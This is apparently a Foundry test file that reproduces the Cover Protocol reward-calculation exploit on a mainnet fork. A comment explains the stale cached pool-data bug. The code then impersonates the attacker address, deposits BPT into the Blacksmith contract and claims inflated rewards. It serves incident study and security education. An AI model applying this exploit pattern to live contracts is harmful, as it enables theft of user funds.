// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./Interface.sol";

/*
Cover Protocol Exploit PoC

The contract caches the pool data in memory to save some gas, updates the pool data in storage but 
forgets to update the cached data. The outdated cached data is later used in calculations and that 
enables the hack.

Steps
1. The attacker deposited some BPT tokens of this pool into the Blacksmith contract.
2. The attacker then withdrew almost all of the LP tokens from the Blacksmith contract.
3. The attacker then deposited some tokens of this pool again into the Blacksmith contract. 

Since the totalTokenBalance was reduced a lot in the previous transaction, the newly calculated 
accRewardsPerToken shot up.

4. The attacker then withdrew their rewards.

forge test --contracts ./test/2_Cover.sol --match-contract CoverProtocolHack -vv
*/

interface CheatCode {
    function createSelectFork(string calldata , uint256 ) external returns (uint256);
    function prank(address) external;
}

interface Blacksmith {
  function claimRewardsForPools(address[] calldata _lpTokens) external;

  function claimRewards(address _lpToken) external;

  function deposit(address _lpToken, uint256 _amount) external;

  function withdraw(address _lpToken, uint256 _amount) external;
}

contract CoverProtocolHack is DSTest {
    CheatCode cheat = CheatCode(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    Blacksmith public bs = Blacksmith(0xE0B94a7BB45dD905c79bB1992C9879f40F1CAeD5);

    IERC20 public bpt = IERC20(0x59686E01Aa841f622a43688153062C2f24F8fDed);

    IERC20 public Cover = IERC20(0x5D8d9F5b96f4438195BE9b99eee6118Ed4304286);

    function setUp() public {
        cheat.createSelectFork("https://rpc.ankr.com/eth", 11542309);
    }

    function test_claimRewards() public {

        address attacker = 0x00007569643bc1709561ec2E86F385Df3759e5DD;

        console.log("Before Attack");
        console.log("Cover Token Balance: ", Cover.balanceOf(attacker));
        //console.log("BPT Token Balance: ", bpt.balanceOf(attacker));

        cheat.prank(attacker);
        //bs.deposit(address(bpt), bpt.balanceOf(attacker));
        bs.deposit(address(bpt), 15255552810089260015361);

        cheat.prank(attacker);
        bs.claimRewards(address(bpt));

        console.log("After Attack");
        console.log("Cover Token Balance: ", Cover.balanceOf(attacker));
        //console.log("BPT Token Balance: ", bpt.balanceOf(attacker));
    }
}